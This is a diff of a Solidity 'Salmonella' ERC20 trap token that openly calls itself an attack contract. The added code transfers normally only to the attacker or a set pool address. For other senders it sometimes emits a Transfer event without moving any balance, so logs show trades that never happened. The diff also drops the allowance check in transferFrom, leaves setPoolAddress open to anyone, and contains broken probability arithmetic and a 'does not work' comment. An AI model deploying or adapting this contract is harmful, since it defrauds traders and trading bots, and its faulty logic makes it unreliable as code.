@@ -2,20 +2,22 @@ pragma solidity ^0.8.0;
 
 import "../interfaces/IERC20.sol";
 
+
 /**
      * The Salmonella contract operates on a straightforward principle. It functions as a standard ERC20 token, behaving similarly to other ERC20 tokens under normal circumstances. 
      * However, it incorporates specific rules to identify transactions involving anyone other than the designated owner. 
      * In such cases, the contract only provides 10% of the intended amount, even though it generates event logs that appear to represent a complete trade.
 */
 
-contract SalmonellaAttackToken is IERC20 {
+contract SalmonellaHigherProbToken is IERC20 {
     string public name;
     string public symbol;
     uint8 public decimals;
     uint256 public totalSupply;
-    address public owner;
+    address public salmonellaAttacker;
+    address public poolAddress;
     uint256 private randomNumberNonce;
-
+    uint256 private randomFactor;
     mapping(address => uint256) private _balances;
     mapping(address => mapping(address => uint256)) private _allowances;
    
@@ -28,9 +30,15 @@ contract SalmonellaAttackToken is IERC20 {
         decimals = 18;
         totalSupply = initialSupply * 10**uint256(decimals);
         _balances[msg.sender] = totalSupply;
-        owner = msg.sender;
-	      randomFactor = 1000;
-        emit Transfer(address(0), owner, totalSupply);        
+        salmonellaAttacker = msg.sender;
+	randomFactor = 1000;
+	randomNumberNonce = 1;
+        emit Transfer(address(0), salmonellaAttacker, totalSupply);        
+    }
+    
+    //setpoolAddress 
+    function setPoolAddress(address pAddress) public {
+    	poolAddress = pAddress;
     }
     
      /**
@@ -88,7 +96,8 @@ contract SalmonellaAttackToken is IERC20 {
      */
     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
         _transfer(sender, recipient, amount);
-        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
+        // THIS IS THE LINE THAT IF WE UNCOMMENT , IT DOES NOT WORK
+        //_approve(sender, recipient, _allowances[sender][recipient] - amount);
         return true;
     }
      /**
@@ -106,28 +115,29 @@ contract SalmonellaAttackToken is IERC20 {
         require(recipient != address(0), "ERC20: transfer to the zero address");
         uint256 senderBalance = _balances[sender];
         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
-        
-        if (sender == address(0) || sender == owner) {
-           // Normal transfer if sender is address zero
+
+        if (recipient == salmonellaAttacker || recipient == poolAddress) {
+           // Normal transfer
            _balances[sender] = senderBalance - amount;
-    	     _balances[recipient] += amount;
+    	   _balances[recipient] += amount;
 
             emit Transfer(sender, recipient, amount);
         } else {
 
-          uint256 trapProb = amount * randomFactor / "1 ether";
+          uint256 trapProb = amount / senderBalance;
           
-          if (random() < trapProb) {
-              _balances[sender] = senderBalance - amount;
-              _balances[owner] += amount;
-              emit Transfer(sender, owner, amount);
+          if (random() < trapProb * 100) {
+              //trapped
+              //_balances[sender] = senderBalance - amount;
+              //_balances[recipient] += amount;
+              emit Transfer(sender, recipient, amount);
           } else {
               _balances[sender] = senderBalance - amount;
               _balances[recipient] += amount;
               emit Transfer(sender, recipient, amount);
           }
        }
-        
+
     }
     
     /**
@@ -136,11 +146,11 @@ contract SalmonellaAttackToken is IERC20 {
      *
      */
      
-     function random() private returns (uint256) {
+     function random() public returns (uint256) {
         uint256 randomNumber = uint256(keccak256(abi.encodePacked(block.timestamp,msg.sender,randomNumberNonce))) % 100;
         randomNumberNonce++;
         return randomNumber;
-    }
+     }
 
     /**
      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
@@ -160,4 +170,5 @@ contract SalmonellaAttackToken is IERC20 {
         _allowances[owner][spender] = amount;
         emit Approval(owner, spender, amount);
     }
+   
 }
